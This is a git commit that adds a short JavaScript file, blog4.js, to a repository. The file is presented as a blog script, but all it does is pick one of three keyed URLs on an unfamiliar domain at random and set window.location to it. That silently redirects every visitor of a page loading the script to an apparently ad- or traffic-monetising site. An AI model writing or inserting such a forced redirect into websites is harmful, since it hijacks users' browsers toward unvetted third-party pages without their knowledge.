db21e06f0634a23747be49ec800b934c2dca7e35
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2022-04-09 21:13:37 +0700

    Create blog4.js

---
+++ blog4.js
@@ -0,0 +1,12 @@
+var dataUrl = [
+  
+  'https://practicallysacrificestock.com/zwq4zqn7x?key=4a867a0e416c4bade143b800341f8358',
+
+
+'https://practicallysacrificestock.com/n8h3zwf7j?key=b9a6d33fbc1e04daf43fc3a1e278381f',
+
+'https://practicallysacrificestock.com/y508wur2?key=e57dc7d25ee44cdcbaf224d25522fa21'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
